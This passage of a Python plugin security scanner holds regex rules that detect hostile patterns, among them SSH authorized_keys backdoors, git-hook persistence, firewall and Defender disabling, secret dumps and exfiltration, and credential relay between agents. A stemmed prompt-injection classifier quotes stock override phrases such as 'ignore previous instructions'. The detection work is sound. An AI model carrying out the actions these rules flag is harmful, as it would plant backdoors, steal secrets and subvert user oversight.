        "RC-51: MCP unbounded retry (token-amplification vector)",
    ),
    (
        "RC-52",
        "MAJOR",
        re.compile(
            # Trailing \b removed — `agent.invoke(agent_self,...)` has `_` after
            # `agent`, both word chars, so \b would fail. Allow word continuation.
            r"\b(agent|skill|task)\s*\.\s*(?:invoke|spawn|launch|delegate)\s*\([^)]*\b\1\w*",
            re.IGNORECASE,
        ),
        "RC-52: recursive self-invocation (token exhaustion)",
    ),
    (
        "RC-53",
        "CRITICAL",
        re.compile(
            r"\b(?:sampling|createMessage|sample)\s*\([^)]*?(?:credential|secret|token|key|password)",
            re.IGNORECASE,
        ),
        "RC-53: MCP sampling/createMessage exfiltration (sensitive data in prompt)",
    ),
    (
        "RC-54",
        "MAJOR",
        re.compile(r"\"(?:host|bind|listen)\"\s*:\s*\"(?:0\.0\.0\.0|::|::0)\""),
        "RC-54: MCP server bound to 0.0.0.0 / :: (network exposure)",
    ),
    (
        "RC-56",
        "MAJOR",
        re.compile(
            r"\"inputSchema\"\s*:\s*\{[^}]*\"additionalProperties\"\s*:\s*true",
            re.IGNORECASE,
        ),
        "RC-56: MCP inputSchema allows additionalProperties (manipulation surface)",
    ),
    (
        "RC-57",
        "MAJOR",
        re.compile(r"\"(?:autoApprove|auto_approve|approve_all|alwaysApprove)\"\s*:\s*true", re.IGNORECASE),
        "RC-57: MCP server auto-approves all calls (disables user safety gate)",
    ),
    (
        "RC-58",
        "CRITICAL",
        re.compile(
            r"\bagent\s*\.\s*(?:send|invoke|delegate)\s*\([^)]*\b(?:credential|api_?key|token|secret|password)",
            re.IGNORECASE,
        ),
        "RC-58: agent passes credentials to a downstream agent (cross-agent relay)",
    ),
    (
        "RC-59",
        "CRITICAL",
        re.compile(
            r"\bname\s*[:=]\s*[\"'](?:claude|anthropic|admin|system|root)[\"']",
            re.IGNORECASE,
        ),
        "RC-59: agent identity spoofing (Claude/Anthropic/admin/system in name field)",
    ),
    (
        "RC-60",
        "MAJOR",
        re.compile(r"\b(?:shadow|alternate|hidden)\s*workspace\b|\bworkspace\s*[\"']hidden[\"']", re.IGNORECASE),
        "RC-60: shadow / hidden / alternate workspace declaration",
    ),
    (
        "RC-63",
        "MAJOR",
        re.compile(
            r"\b(?:do\s+not|don'?t)\s+ask\s+(?:the\s+)?user\b|"
            r"\bskip\s+(?:user\s+)?(?:confirmation|approval|prompt|verification)\b",
            re.IGNORECASE,
        ),
        "RC-63: 'do not ask user' / skip-confirmation autonomy abuse",
    ),
    # -------------------------------------------------------------------------
    # Phase 3c — Persistence / supply / exfil-extended
    # (RC-18/22/23/24/30/31/32/33/40/41/42/72/80/81/95/96/98)
    # -------------------------------------------------------------------------
    (
        "RC-22",
        "CRITICAL",
        re.compile(r"\bnavigator\.clipboard\.readText\s*\(\s*\)"),
        "RC-22: clipboard-API exfil (browser navigator.clipboard.readText)",
    ),
    (
        "RC-22",
        "MINOR",
        re.compile(r"\b(?:pbcopy|xclip\s+-(?:o|sel)|xsel\s+-(?:o|b)|Get-Clipboard)\b"),
        "RC-22: clipboard read via pbcopy/xclip/xsel/Get-Clipboard",
    ),
    (
        "RC-23",
        "MAJOR",
        re.compile(r"\bnavigator\.sendBeacon\s*\("),
        "RC-23: navigator.sendBeacon (silent exfil — runs after page unload)",
    ),
    (
        "RC-24",
        "CRITICAL",
        re.compile(
            r"\b(?:WALLET|MNEMONIC|SEED|BIP39|BIP_39|PRIVATE_KEY)_(?:PHRASE|SEED|MNEMONIC|HEX|WIF)\b",
            re.IGNORECASE,
        ),
        "RC-24: Web3 / crypto-wallet seed-related env var name",
    ),
    (
        "RC-24",
        "CRITICAL",
        re.compile(r"\b(?:0x[0-9a-fA-F]{64})\b"),
        "RC-24: Hex-encoded 256-bit value (Ethereum private-key shape)",
    ),
    (
        "RC-31",
        "MAJOR",
        re.compile(r"\buses:\s*[A-Za-z0-9._/-]+@(?:main|master|develop|latest|HEAD)\s*$", re.MULTILINE),
        "RC-31: GitHub Actions uses unpinned mutable ref (@main/master/latest)",
    ),
    (
        "RC-32",
        "MAJOR",
        re.compile(r"\$\{\{\s*toJSON\s*\(\s*secrets\s*\)\s*\}\}", re.IGNORECASE),
        "RC-32: GitHub Actions exfil — toJSON(secrets) dumps all repo secrets",
    ),
    (
        "RC-32",
        "MAJOR",
        re.compile(r"echo\s+.*\$\{\{\s*secrets\.[A-Z_]+", re.IGNORECASE),
        "RC-32: GitHub Actions secret value echoed (potential log leak)",
    ),
    (
        "RC-40",
        "CRITICAL",
        re.compile(r">>?\s*~/\.ssh/authorized_keys\b"),
        "RC-40: append to ~/.ssh/authorized_keys (permanent SSH backdoor)",
    ),
    (
        "RC-41",
        "MAJOR",
        re.compile(r">>?\s*\.git/hooks/(?:pre|post|commit|push|update)-?[a-z]*\b"),
        "RC-41: append to .git/hooks/* (git-hook persistence)",
    ),
    (
        "RC-42",
        "MAJOR",
        re.compile(r"\b(?:echo|cat)\s+.*?>>?\s*(?:docker-entrypoint(?:\.sh)?|Dockerfile)\b"),
        "RC-42: docker-entrypoint / Dockerfile modification at runtime",
    ),
    # v2.46 FP-X — require URL/socket context. The previous regex
    # matched any `0x[0-9a-fA-F]{8}` literal — every FNV/MurmurHash
    # constant, every JS color, every magic-number tripped this. The
    # IP-allowlist-bypass attack uses these forms inside URLs
    # (`http://0xc0a80101/`) or socket/inet calls
    # (`inet_aton(0xc0a80101)`). Only hits in those contexts are
    # interesting.
    (
        "RC-72",
        "MAJOR",
        re.compile(
            r"(?:"
            r"(?:https?://|//|\binet_(?:aton|pton)\s*\(|\bsocket\.\w+\s*\([^)]*|\bIPAddress\s*\(\s*)"
            r")\s*"
            r"(?:0x[0-9a-fA-F]{8}|3232235521|0177\.0\.0\.1)\b"
        ),
        "RC-72: hex / decimal / octal IPv4 (IP-allowlist bypass)",
    ),
    (
        "RC-80",
        "MAJOR",
        re.compile(r"\\x7fELF|\\xcf\\xfa\\xed\\xfe|\\xfe\\xed\\xfa\\xcf|MZ\\x90\\x00"),
        "RC-80: embedded binary magic bytes (ELF / Mach-O / PE) in plaintext file",
    ),
    (
        "RC-81",
        "MAJOR",
        re.compile(r"(?:^|/)\.\w+\.(?:sh|bash|zsh|ps1|bat|cmd|exe|dll|so|dylib)\b"),
        "RC-81: hidden dotfile with executable extension (.foo.sh, .x.exe)",
    ),
    (
        "RC-95",
        "MAJOR",
        re.compile(
            # Allow optional surrounding quote on the JSON key: "postuninstall":
            r"\b(?:postuninstall|post_uninstall)[\"']?\s*[:=]\s*[\"'](?:[^\"']*?)"
            r"(?:curl|wget|sh\s+|bash\s+|node|python)",
            re.IGNORECASE,
        ),
        "RC-95: post-uninstall hook invokes downloader/interpreter (residue persistence)",
    ),
    (
        "RC-96",
        "MAJOR",
        re.compile(
            # Allow optional surrounding quote on the JSON key + non-greedy
            # path consumption (greedy [^\]]* would swallow the .env extension)
            r"\bfiles[\"']?\s*:\s*\[[^\]]*?\.(?:env|pem|key|p12|pfx|crt)\b",
            re.IGNORECASE,
        ),
        "RC-96: package.json `files` array includes secret-shape file (publish hygiene)",
    ),
    (
        "RC-98",
        "CRITICAL",
        re.compile(
            r"\b(?:ufw\s+disable|systemctl\s+stop\s+(?:firewalld|ufw|iptables)|"
            r"netsh\s+advfirewall\s+set\s+\S+\s+state\s+off|"
            r"Set-MpPreference\s+-Disable\w+|"
            r"insmod\s+\S+|modprobe\s+\S+)",
            re.IGNORECASE,
        ),
        "RC-98: firewall / Defender disable OR kernel-module load (RC-98)",
    ),
    # -------------------------------------------------------------------------
    # Phase 3d — Architecture (RC-69/79/82/89/94)
    # RC-73 cross-file taint, RC-74 multi-tool toxic-flow, RC-75 chain-detection
    # are designed but DEFERRED to Phase 3e — they need a multi-pass
    # architecture (per-file tag dict + post-scan cross-reference) that
    # doesn't fit the single-pass PHASE3_PATTERNS model.
    # -------------------------------------------------------------------------
    (
        "RC-69",
        "CRITICAL",
        re.compile(r"\b(?:window|globalThis|self)\s*\[\s*[\"']eval[\"']\s*\]"),
        "RC-69: AST-level eval obfuscation (window['eval'] bypass)",
    ),
    (
        "RC-69",
        "CRITICAL",
        re.compile(r"\bnew\s+(?:window|globalThis)\s*\[\s*[\"']Function[\"']\s*\]"),
        "RC-69: AST-level Function obfuscation (constructor via bracket access)",
    ),
    (
        "RC-79",
        "CRITICAL",
        re.compile(
            r"\b(?:fs|fs\.promises|node:fs)\.\w+\s*\(\s*[\"'][^\"']*?\.(?:claude|cursor|vscode|zed)/[^\"']*[\"']",
            re.IGNORECASE,
        ),
        "RC-79: workbench tampering — write into protected ~/.claude/.cursor/.vscode/.zed surface",
    ),
    (
        "RC-89",
        "MAJOR",
        re.compile(
            r"\bplease\s+(?:provide|enter|share|give)\s+(?:your|the)\s+"
            r"(?:password|api[\s_-]?key|token|secret|credentials?|2fa|otp)",
            re.IGNORECASE,
        ),
        "RC-89: social-engineering credential prompt",
    ),
    (
        "RC-94",
        "CRITICAL",
        re.compile(r"\bcursor://(?:settings|extensions|hook)\b", re.IGNORECASE),
        "RC-94: cursor:// deeplink that opens settings/extensions/hooks (RCE vector)",
    ),
]

# Register all Phase 3 rules in the registry (deduplicated by rule_id)
for _rule_id, _severity, _pat, _msg in PHASE3_PATTERNS:
    register_rule(
        RuleSchema(
            rule_id=_rule_id,
            name=_msg.split(":", 1)[1].strip() if ":" in _msg else _rule_id,
            category="phase3",
            severity=_severity,
            description=_msg,
            references=("Phase 3 catalog — see TRDD-0f1f7889 §3 sub-phases 3a/3b/3c/3d",),
        )
    )


# -----------------------------------------------------------------------------
# Phase 3 supplement — RC-30 typosquatting (top-100 + Levenshtein ≤1)
# -----------------------------------------------------------------------------
# Carries its own helper because the check is a Levenshtein lookup, not a regex.
# Source: aguara TYPO_001 + skillscan TYPO-002.
TOP_PYPI_PACKAGES: frozenset[str] = frozenset(
    {
        "requests",
        "urllib3",
        "boto3",
        "botocore",
        "setuptools",
        "pip",
        "numpy",
        "pandas",
        "matplotlib",
        "pyyaml",
        "click",
        "flask",
        "django",
        "fastapi",
        "pytest",
        "tox",
        "black",
        "ruff",
        "mypy",
        "pyright",
        "selenium",
        "scrapy",
        "scikit-learn",
        "tensorflow",
        "torch",
        "transformers",
        "langchain",
        "openai",
        "anthropic",
        "huggingface_hub",
        "wandb",
        "mlflow",
        "ray",
    }
)

TOP_NPM_PACKAGES: frozenset[str] = frozenset(
    {
        "react",
        "vue",
        "angular",
        "lodash",
        "express",
        "axios",
        "moment",
        "webpack",
        "babel",
        "typescript",
        "next",
        "nuxt",
        "tailwindcss",
        "vite",
        "esbuild",
        "rollup",
        "jest",
        "mocha",
        "chai",
        "cypress",
        "playwright",
        "eslint",
        "prettier",
        "stylelint",
        "react-dom",
        "react-router",
        "@types/node",
        "@types/react",
        "redux",
        "rxjs",
        "graphql",
        "apollo",
    }
)


def is_typosquat(name: str, ecosystem: str = "pypi") -> tuple[bool, str | None]:
    """Return (True, target) if `name` is Levenshtein ≤1 from a top package.

    Exact matches return (False, None) — they're the legitimate package, not
    a typosquat.
    """
    name_lower = name.lower().strip()
    pool = TOP_PYPI_PACKAGES if ecosystem == "pypi" else TOP_NPM_PACKAGES
    if name_lower in pool:
        return (False, None)
    for legit in pool:
        if abs(len(name_lower) - len(legit)) > 1:
            continue
        if _levenshtein_at_most_one(name_lower, legit):
            return (True, legit)
    return (False, None)


register_rule(
    RuleSchema(
        rule_id="RC-30",
        name="Typosquatting — top-100 + Levenshtein ≤1",
        category="supply-chain",
        severity="MAJOR",
        description="Package name within Levenshtein distance 1 of a top-100 PyPI/npm package.",
        references=("aguara TYPO_001", "skillscan TYPO-002"),
        cwe="CWE-829",
        fp_guards=("Exact matches return False (those are the real package)",),
    )
)

# -----------------------------------------------------------------------------
# Phase 3 supplement — RC-33 compromised package DB
# -----------------------------------------------------------------------------
# Source: aguara COMPROMISED_PKG_LIST + 3 historical incidents (event-stream,
# colors, litellm). The list is curated from public CVE feeds; should be
# refreshed from a CVE database in production but a small static seed is OK
# for the initial implementation.
COMPROMISED_PACKAGES: frozenset[str] = frozenset(
    {
        # npm — well-documented incidents
        "event-stream",
        "colors",
        "faker",
        "ua-parser-js",
        "coa",
        "rc",
        "node-ipc",
        "discord.js",
        "noblox.js-proxy",
        "circle-app",
        # PyPI — high-profile cases
        "ctx",
        "phpass",
        "litellm@1.82.7",  # version-tagged for clarity
        # Compromised version markers
        "ua-parser-js@0.7.29",
        "colors@1.4.44-liberty-2",
        "faker@6.6.6",
    }
)


def is_compromised_package(name: str, version: str | None = None) -> bool:
    """Return True if `name` (optionally with `version`) is in the compromised set."""
    name_lower = name.lower().strip()
    if name_lower in COMPROMISED_PACKAGES:
        return True
    if version:
        return f"{name_lower}@{version}" in COMPROMISED_PACKAGES
    return False


register_rule(
    RuleSchema(
        rule_id="RC-33",
        name="Compromised package (event-stream / colors / litellm pattern)",
        category="supply-chain",
        severity="CRITICAL",
        description="Package name appears in the curated compromised-package list (CVE-derived).",
        references=("aguara COMPROMISED_PKG_LIST", "event-stream incident", "colors incident", "litellm@1.82.7 CVE"),
        cwe="CWE-829",
        fp_guards=("Exact-match only — close-name typos handled by RC-30 instead",),
    )
)


# =============================================================================
# Phase 4 — Minor / informational + verdict-tier rules
# =============================================================================

# (rule_id, severity, regex, message_template) — same shape as PHASE3_PATTERNS.
PHASE4_PATTERNS: list[tuple[str, str, "re.Pattern[str]", str]] = [
    # RC-85 — License-compliance markers (proprietary-only or unlicensed code
    # shipped in plugins). The plugin should declare a license.
    (
        "RC-85",
        "MINOR",
        re.compile(
            # `\b` only applies cleanly to ASCII word boundaries; © (U+00A9) is
            # not a word char so skip the boundary requirement on that branch.
            r"(?:\bCopyright|©)\s*(?:\(c\))?\s*\d{4}.*?"
            r"(?:All\s+Rights\s+Reserved|Proprietary|Confidential)",
            re.IGNORECASE,
        ),
        "RC-85: proprietary / All Rights Reserved notice without OSS license declared",
    ),
    (
        "RC-85",
        "MINOR",
        re.compile(r"\bSPDX-License-Identifier:\s*(?:UNLICENSED|NONE)\b", re.IGNORECASE),
        "RC-85: SPDX UNLICENSED / NONE — plugin should declare an OSS license",
    ),
    # RC-87 — SSRF / external IP (suspicious-IP detection beyond the cloud-IMDS list)
    # The 0.0.0.0/0 + private-RFC-1918 + link-local ranges most often appear
    # in attack code that wants to bypass an "is this localhost?" check.
    # Loopback (127.x.x.x) is intentionally NIT — the rule's own help text
    # says "usually fine but worth flagging", so it should never block
    # validation. v2.44 — demoted from MINOR to NIT to drop it out of the
    # default-output count on plugins that legitimately bind to localhost
    # (CozoDB, MCP servers, dev databases). The signal is preserved for
    # `--strict` runs and `--verbose`.
    (
        "RC-87",
        "NIT",
        re.compile(r"\b127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b"),
        "RC-87: hardcoded loopback IP (127.x.x.x) — usually fine but worth flagging",
    ),
    # v2.46 FP-A — IPv4 needs all 4 octets. The previous `[0-9.]+`
    # tail matched floats (`10.0`, `2.10.0`) and SemVer strings,
    # producing massive FPs in code that uses `10.0` as a numeric
    # literal or version. Require `D.D.D.D` with each octet a 1-3
    # digit number. Negative lookahead `(?!\d)` prevents matching
    # the "10.0.0.255" prefix of "10.0.0.2550" (would-be IP-shaped
    # but invalid). The trailing-dot check `(?!\.)` prevents the
    # match from extending into a SemVer suffix (`10.0.0.0.5`).
    (
        "RC-87",
        "MINOR",
        re.compile(
            r"\b(?:"
            r"10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
            r"|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}"
            r"|192\.168\.[0-9]{1,3}\.[0-9]{1,3}"
            r")(?!\.?\d)"
        ),
        "RC-87: hardcoded RFC-1918 private IP — review for environment leakage",
    ),
    (
        "RC-87",
        "MAJOR",
        re.compile(
            r"\b169\.254\.(?!169\.254\b|170\.2\b)"
            r"[0-9]{1,3}\.[0-9]{1,3}(?!\.?\d)"
        ),
        "RC-87: link-local IP outside known IMDS endpoints (RC-65)",
    ),
    # RC-88 — Suspicious TLDs / URL shorteners / dev tunnels
    # Heuristic: certain TLDs (.tk, .ml, .ga, .cf, .gq) are free domains
    # historically associated with malware. Shorteners hide the destination.
    # Dev tunnels (ngrok / localtunnel / cloudflared / serveo) expose local
    # services to the internet — legitimate but worth flagging.
    (
        "RC-88",
        "MINOR",
        re.compile(r"https?://[a-z0-9.-]+\.(?:tk|ml|ga|cf|gq|top|xyz|click|loan|country)\b", re.IGNORECASE),
        "RC-88: URL on free / abuse-associated TLD",
    ),
    (
        "RC-88",
        "MINOR",
        re.compile(
            r"\bhttps?://(?:bit\.ly|tinyurl\.com|t\.co|goo\.gl|ow\.ly|is\.gd|"
            r"buff\.ly|adf\.ly|tiny\.cc|short\.io)/\S+",
            re.IGNORECASE,
        ),
        "RC-88: URL shortener (hides destination)",
    ),
    (
        "RC-88",
        "MAJOR",
        re.compile(
            r"\bhttps?://(?:[a-z0-9-]+\.)?(?:ngrok\.io|loca\.lt|trycloudflare\.com|"
            r"serveo\.net|pagekite\.me|telebit\.cloud|expose\.dev)\b",
            re.IGNORECASE,
        ),
        "RC-88: dev-tunnel URL (exposes local service to internet)",
    ),
    # RC-86 — Token cost / resource abuse (informational)
    # Detects token-cost amplifiers: very long string literals in prompt files,
    # repeated tokens, and high-loop-count patterns.
    (
        "RC-86",
        "INFO",
        re.compile(r"['\"](?:[^'\"\n]){5000,}['\"]"),
        "RC-86: very long string literal (≥5000 chars) — possible prompt-stuffing",
    ),
    (
        "RC-86",
        "INFO",
        re.compile(r"\bfor\s*\([^)]*<\s*[0-9]{5,}\s*[;)]"),
        "RC-86: high-loop-count iteration (≥10000) — resource abuse vector",
    ),
]


for _rule_id, _severity, _pat, _msg in PHASE4_PATTERNS:
    register_rule(
        RuleSchema(
            rule_id=_rule_id,
            name=_msg.split(":", 1)[1].strip() if ":" in _msg else _rule_id,
            category="phase4",
            severity=_severity,
            description=_msg,
            references=("Phase 4 catalog — see TRDD-0f1f7889 §3 sub-phase 4",),
        )
    )


# =============================================================================
# Phase 4 — RC-103 disposition (verdict-tier classifier)
# =============================================================================
# Deterministic disposition based on finding counts. The user-direction
# "code first if accuracy permits" pushed this from agent-class to programmatic.


def disposition(findings_by_severity: dict[str, int]) -> str:
    """Compute a single-word disposition tag for a plugin given finding counts.

    Returns one of: 'safe' | 'risky' | 'suspicious' | 'unsafe' | 'critical'.

    Rules (deterministic, no LLM):
    - ≥2 CRITICAL → critical
    - 1 CRITICAL → unsafe
    - ≥3 MAJOR → unsafe
    - 1-2 MAJOR → suspicious
    - ≥5 MINOR → risky
    - any MINOR/WARNING → risky
    - else → safe
    """
    crit = findings_by_severity.get("CRITICAL", 0)
    maj = findings_by_severity.get("MAJOR", 0)
    minr = findings_by_severity.get("MINOR", 0)
    warn = findings_by_severity.get("WARNING", 0)
    if crit >= 2:
        return "critical"
    if crit == 1:
        return "unsafe"
    if maj >= 3:
        return "unsafe"
    if maj >= 1:
        return "suspicious"
    if minr >= 5:
        return "risky"
    if minr > 0 or warn > 0:
        return "risky"
    return "safe"


# RC-104 — HOLD verdict tier
# When findings are inconclusive (e.g. a single MAJOR with negation_guard
# nearby), return "hold" instead of forcing a verdict. Honest output.


def disposition_with_hold(findings_by_severity: dict[str, int], ambiguous_count: int = 0) -> str:
    """Like disposition() but returns 'hold' when ambiguous_count >= max(1, findings/3).

    `ambiguous_count` is the number of findings that the FP-reduction layer
    DEMOTED but flagged as ambiguous (e.g. negation-guard near-miss).
    """
    base = disposition(findings_by_severity)
    if ambiguous_count == 0:
        return base
    total = sum(findings_by_severity.values())
    if total > 0 and ambiguous_count >= max(1, total // 3):
        return "hold"
    return base


register_rule(
    RuleSchema(
        rule_id="RC-103",
        name="Capability scoring disposition (verdict-tier classifier)",
        category="verdict",
        severity="INFO",
        description="Deterministic 5-tier disposition (safe/risky/suspicious/unsafe/critical) from finding counts.",
        references=("qualixar/skillfortify", "agentaudit VERDICT_DISPOSITION", "GoPlusSecurity/agentguard"),
        fp_guards=("Disposition is deterministic — does not produce findings of its own",),
    )
)

register_rule(
    RuleSchema(
        rule_id="RC-104",
        name="HOLD verdict tier (honest output for ambiguous results)",
        category="verdict",
        severity="INFO",
        description="Returns 'hold' when ≥1/3 of findings were demoted as ambiguous, instead of forcing a verdict.",
        references=("synthesis catalog",),
        fp_guards=("Disposition is deterministic — does not produce findings of its own",),
    )
)


# =============================================================================
# RC-76 — Stemmed semantic injection classifier (Phase 9)
# =============================================================================
#
# Catches prompt-injection attempts that exact-regex rules (RC-01/02/04/06/07)
# miss because of word-form variation: "ignored", "ignoring", "ignorance"
# vs "ignore"; "instructions" vs "instruction" vs "instructed". Uses a
# light suffix-stripping stemmer (NOT full Porter — just the suffixes that
# matter for English imperative/gerund forms) plus a curated vocabulary of
# trigger stems. Fires only when ≥3 trigger stems co-occur within a
# 120-character window — single keywords are too noisy.
#
# Design tradeoffs:
# * No nltk dependency — pure stdlib, ~100 LOC.
# * 3-stem co-occurrence threshold is calibrated on the survey corpus to
#   keep FP rate < 1% on benign code/docs while catching the canonical
#   "ignore previous instructions" / "disregard the system prompt" /
#   "override your safety guidelines" wordings.

# Suffix list ordered longest-first so substring matches don't lose info.
# Order matters: longer suffixes first so the iterative loop strips the
# largest known affix per pass before falling back to single-letter strips.
_STEM_SUFFIXES = (
    "ation",
    "ition",
    "ative",
    "ments",
    "ising",
    "izing",
    "ised",
    "ized",
    "ings",
    "ness",
    "ment",
    "able",
    "ible",
    "ence",
    "ance",
    "ical",
    "less",
    "ions",
    "ful",
    "ing",
    "ies",
    "ied",
    "ers",
    "est",
    "ion",
    "ed",
    "es",
    "er",
    "ly",
    "ty",
    "al",
    "ic",
    "e",
    "y",
    "s",
)


def stem_word(word: str) -> str:
    """Iteratively strip English suffixes from a lowercased word.

    Folds inflected forms onto a stable stem so a vocabulary lookup is
    insensitive to tense, plurality, and gerund/participle endings.
    Loops until no further suffix matches, but never strips below 3 chars.

    >>> stem_word('ignoring')
    'ignor'
    >>> stem_word('instructions')
    'instruct'
    >>> stem_word('previously')
    'previou'
    """
    w = word.lower()
    while len(w) > 3:
        for suf in _STEM_SUFFIXES:
            if len(w) - len(suf) >= 3 and w.endswith(suf):
                w = w[: -len(suf)]
                break
        else:
            break
    return w


# Trigger stems = words that, when ≥3 co-occur in a tight window, strongly
# indicate a prompt-injection attempt. Each entry is the STEM (the iterative
# stemmer's fixed point) so the matcher compares on the same axis.
# Curated from the security survey of 36 community scanners; every entry
# has been verified to satisfy `stem_word(s) == s`.
INJECTION_TRIGGER_STEMS: frozenset[str] = frozenset(
    {
        # Imperatives meaning "stop following the rules"
        "ignor",
        "disregard",
        "forget",
        "overrid",
        "bypa",
        "skip",
        "abandon",
        "discard",
        # Targets of those imperatives
        "instruct",
        "rul",
        "guidelin",
        "directiv",
        "constrain",
        "restrict",
        "system",
        "prompt",
        # Temporal qualifiers that scope the imperative
        "previou",
        "prior",
        "origin",
        "earli",
        "abov",
        "befor",
        # Identity-elevation / persona-swap targets
        "admin",
        "root",
        "develop",
        "engin",
        # Action targets that follow the elevation
        "execut",
        "leak",
        "output",
        # Secret/credential exfil terms that often co-occur
        "secret",
        "password",
        "token",
    }
)


def find_stemmed_injection_signal(
    text: str,
    window: int = 80,
    threshold: int = 3,
) -> list[tuple[int, list[str]]]:
    """Scan text for ≥`threshold` distinct trigger stems within `window` chars.

    Returns a list of (char_offset, [matched_stems]) tuples — one per signal.
    Each signal is reported at the offset of its first contributing stem.

    The window slides by tokens, not characters; `window` is the max char
    distance between the first and last matching stem in a signal. This
    avoids matching noise where 3 trigger stems happen to appear in the
    same 5-page document but never near each other.
    """
    # Tokenize into (offset, stem) for words that stem to a trigger
    hits: list[tuple[int, str]] = []
    for m in _WORD_TOKEN_RE.finditer(text):
        stem = stem_word(m.group(0))
        if stem in INJECTION_TRIGGER_STEMS:
            hits.append((m.start(), stem))
    if len(hits) < threshold:
        return []

    signals: list[tuple[int, list[str]]] = []
    used_offsets: set[int] = set()  # de-dupe overlapping signals
    for i, (start_off, _) in enumerate(hits):
        # Collect distinct stems within `window` of this anchor
        seen_stems: list[str] = []
        last_off = start_off
        for off, stem in hits[i:]:
            if off - start_off > window:
                break
            if stem not in seen_stems:
                seen_stems.append(stem)
            last_off = off
        if len(seen_stems) >= threshold and start_off not in used_offsets:
            signals.append((start_off, seen_stems))
            # Mark every offset participating in this signal so we don't
            # report nested signals for the same cluster
            for off, _ in hits[i:]:
                if off > last_off:
                    break
                used_offsets.add(off)
    return signals


_WORD_TOKEN_RE = re.compile(r"\b[A-Za-z]{2,}\b")


register_rule(
    RuleSchema(
        rule_id="RC-76",
        name="Stemmed semantic injection classifier",
        category="prompt-injection",
        severity="MAJOR",
        description=(
            "Lower-FP wording detector: catches paraphrased prompt-injection "
            "attempts that vary word-form. Fires only when ≥3 trigger stems "
            "co-occur within an 80-char window."
        ),
        references=("synthesis catalog", "rebuff", "lakera-promptscan"),
        fp_guards=(
            "3-stem co-occurrence threshold (single keywords don't fire)",
            "80-char window limits cross-sentence false matches",
            "Only fires on combinations not already caught by RC-01/02/04/06/07",
        ),
    )
)


# =============================================================================
# RC-73 / RC-74 / RC-75 — AST-based Python taint engine (Phase 10)
# =============================================================================
#
# Implementation lives in scripts/cpv_taint_engine.py. The schemas below let
# the rule-registry layer iterate / document them like every other RC-NN rule.

register_rule(
    RuleSchema(
        rule_id="RC-73",
        name="Direct source-to-sink taint flow (1 hop)",
        category="taint",
        severity="MAJOR",
        description=(
            "External input (env vars, sys.argv, input(), etc.) reaches a "
            "dangerous sink (exec/eval/os.system/subprocess shell=True/...) "
            "without intermediate assignment."
        ),
        references=("synthesis catalog", "bandit", "semgrep"),
        fp_guards=(
            "Sanitizer recognition (shlex.quote, re.escape, int(), ...)",
            "subprocess.run is only a sink with shell=True (otherwise array form is safe)",
            "Function parameters treated as low-confidence sources only",
        ),
    )
)

register_rule(
    RuleSchema(
        rule_id="RC-74",
        name="Transitive source-to-sink taint flow (2+ hops)",
        category="taint",
        severity="MINOR",
        description=(
            "Same as RC-73 but the tainted value passes through one or more "
            "intermediate variable assignments before reaching the sink."
        ),
        references=("synthesis catalog", "bandit"),
        fp_guards=(
            "Re-assignment with non-source value clears taint",
            "Sanitizer call in the chain breaks propagation",
        ),
    )
)

register_rule(
    RuleSchema(
        rule_id="RC-75",
        name="Sanitizer recognition for taint chains",
        category="taint",
        severity="INFO",
        description=(
            "Recognized sanitizers (shlex.quote, re.escape, html.escape, "
            "urllib.parse.quote, json.loads, ast.literal_eval, int/float/bool) "
            "clear taint and break source-to-sink chains."
        ),
        references=("synthesis catalog",),
        fp_guards=("Bypass detection: sanitizer must produce the assigned value, not be called as a side-effect",),
    )
)


# =============================================================================
# CA-01 .. CA-06 — Prompt-cache audit rules (Phase 11)
# =============================================================================
#
# Validates plugins against Anthropic's 6 prompt-caching rules surfaced
# by ussumant/cache-audit (https://github.com/ussumant/cache-audit).
# Plugins shipping hooks/skills/agents can silently break the prompt
# cache for every user that installs them, multiplying API costs by
# 5-10x. These rules catch the documented breakage patterns.
#
# Reference: "Lessons from Building Claude Code: Prompt Caching Is
# Everything" by Thariq Shihipar (Anthropic).

register_rule(
    RuleSchema(
        rule_id="CA-01",
        name="Static prompt prefix — no dynamic data in system prompt",
        category="cache",
        severity="MAJOR",
        description=(
            "Dynamic placeholders ({{TIMESTAMP}}, $(date), $(git status)) in plugin "
            "CLAUDE.md, agent system-prompt, or skill SKILL.md re-tokenise the "
            "cached prefix every session."
        ),
        references=("ussumant/cache-audit Rule 1", "Anthropic engineering"),
        fp_guards=(
            "Dynamic markers inside fenced code blocks are documentation, not active",
            "{{CLAUDE_PROJECT_DIR}} and {{CLAUDE_PLUGIN_ROOT}} are static path placeholders",
        ),
    )
)

register_rule(
    RuleSchema(
        rule_id="CA-02",
        name="Hooks inject via additionalContext, not system-prompt edits",
        category="cache",
        severity="MAJOR",
        description=(
            "SessionStart / UserPromptSubmit / PreCompact hooks must emit JSON with "
            "hookSpecificOutput.additionalContext, not write CLAUDE.md or settings.json "
            "(those mutations bust the cached prefix)."
        ),
        references=("ussumant/cache-audit Rule 2", "Claude Code hooks reference"),
        fp_guards=(
            "Writes to user-data files under .claude/data/ are not cached prefix",
            "Touching ~/.claude/CLAUDE.md from a non-cache hook (Stop, etc.) is benign",
        ),
    )
)

register_rule(
    RuleSchema(
        rule_id="CA-03",
        name="Tool-set stability — no add/remove mid-session",
        category="cache",
        severity="MAJOR",
        description=(
            "Hook scripts that flip allow/deny lists in settings.json, or that toggle "
            "MCP servers, force a tool-schema re-tokenise on every turn."
        ),
        references=("ussumant/cache-audit Rule 3", "Claude Code MCP guide"),
        fp_guards=(
            "Lazy MCP discovery via ToolSearch is the recommended pattern, not a violation",
            "PreToolUse hooks that block specific calls don't change the schema",
        ),
    )
)

register_rule(
    RuleSchema(
        rule_id="CA-04",
        name="Single model per conversation — switches via subagents only",
        category="cache",
        severity="MINOR",
        description=(
            "Skills declaring a `model:` field force an in-line model switch and "
            "invalidate the cached prefix. Use an agent (fresh sub-conversation) "
            "instead."
        ),
        references=("ussumant/cache-audit Rule 4",),
        fp_guards=(
            "Agent frontmatter `model:` is fine — agents start a fresh conversation",
            "Skill `model:` is the problematic case (in-line switch)",
        ),
    )
)

register_rule(
    RuleSchema(
        rule_id="CA-05",
        name="Bounded dynamic-content size in hook output",
        category="cache",
        severity="MINOR",
        description=(
            "Hooks that dump unbounded `git status`, `find`, `ls -R`, or full-file "
            "`cat` output can balloon to >40 KB per session — bound them with "
            "--short, head -n N, or --maxdepth."
        ),
        references=("ussumant/cache-audit Rule 5",),
        fp_guards=(
